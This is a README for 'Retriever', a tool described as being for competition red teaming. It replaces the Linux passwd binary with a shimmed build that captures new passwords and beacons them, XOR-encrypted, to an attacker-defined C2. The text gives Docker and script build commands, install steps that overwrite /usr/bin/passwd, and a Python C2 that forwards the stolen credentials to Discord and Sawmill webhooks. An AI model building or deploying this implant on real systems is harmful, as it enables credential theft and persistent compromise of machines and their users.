# Retriever passwd Shim

#### What is this?
This is a basic Linux binary shim method on the `passwd` binary from the shadow package. This will grab new passwords while they are being changed using the binary and send it back to a defined C2.

#### What does it work on? (Tested)

Ubuntu - 18.04+ <br />Centos - 8 <br />Debian - 9+ <br />Arch - Latest  

#### What is this intended for 
This is intended for red teaming in a competition environment.<br><br>

# Build Instructions

## Docker 
Provied in the repository are many Dockerfiles that will build a binary for the operating system you are going to deploy this tool on. If you would like to deploy on a linux distribution that is not listed you can use the provided Dockerfiles as a template to build off of. 

Run the command below replacing the build arguments with the desired values and using the Dockerfile for the correct operating system. 

	docker build . -f ubuntu2204.Dockerfile -o ./out --no-cache --rm --build-arg IP="192.168.1.1" --build-arg PORT="1234" --build-arg INTERFACE="ens2" --build-arg XOR_KEY="bruh"

The binary will be placed in the `docker/out/` path. If you build more than 1 binary from the same distribution it will overwrite the binary that has the same name. 

#### Build Arguements
- **IP** : IP address credentials will be sent to
- **PORT**		 : Destination port to send credentials to  	
- **INTERFACE**  : The interface that the binary will use on the machine to send credentials
- **XOR_KEY**: The password used to encrypt the credentials 
<br><br>
## Using VM or Host
Build binaries on the same operating system that it will be deployed on to reduce risk of issues with binary running. It is highly recommended you match the version as closely as possible.
### Dependancies
The dependancies for this project are listed below. There are also prepared commands to install dependancies using different package managers and distros. 
	
	git make wget autoconf autopoint libtool xsltproc bison
#### Distro Examples
##### Ubuntu / Debian
	apt install -y git wget make autoconf autopoint libtool xsltproc bison
##### RHEL Based
	yum install -y git wget make autoconf gettext-devel libtool libxslt bison
##### Arch
	pacman -Syu --noconfirm git wget make autoconf gettext libtool libxslt patch automake gcc bison
##### Alpine
	apk add git wget make autoconf gettext-dev libtool libxslt bison gcc
### Run Build Script
Clone the Retriever repository. The most up to date version is most likely the best one. 
	
	git clone https://github.com/P4ral1ax/Retriever
Run the `generate.sh` script as a superuser. It will display the variables entered and then it will start the build process. If you would like to change the parameteres you can run the script again and it should run much faster and it WILL overwrite existing files. 
	
	./generate.sh {C2 Address} {Port} {Inferface} {XOR Password}
The generated binary will be placed in the Retriever directory with the correct permissions. If the file does not appear the build process has failed.

Parameter definitions
- **C2 Address** : IP address credentials will be sent to
- **Port**		 : Destination port to send credentials to  	
- **Interface**  : The interface that the binary will use on the machine to send credentials
- **XOR Password**: The password used to encrypt the credentials 

### Install
To install the implant it is easy as replacing the original `passwd` binary on the system with the shimmed binary. Common location for this binary is `/usr/bin/passwd` and `/bin/passwd`. <br><br>


## Using the Python C2
This tool includes a simple server to recieve the credentals beaconed by the binary. This includes XOR decryption, parsing, and forwarding to a Discord and Sawmill webhook. 

A custom server could easily be used with retriever if desired. 
#### Pip Dependancies  
	python-dotenv requests
#### .env File

The python C2 expects a .env file to provide various parameters to run correctly. The C2 will run without a .env file but it highly recommended that it is utilized. 

#### .env Values

- **WEBHOOK** 	 : Set the Discord webhook (Default : none)
- **XOR_KEY** 	 : The key used to encrypt and decrypt (Default : bingus) 
- **PORT**    	 : Set the port the program listens on (Default : 8000)
- **SAWMILLURL** : Set the Sawmill URL (Default : none)

### Running the C2

Make sure firewalls allow traffic into that port then run the python file using Python3.

	python3 recv_pass.py
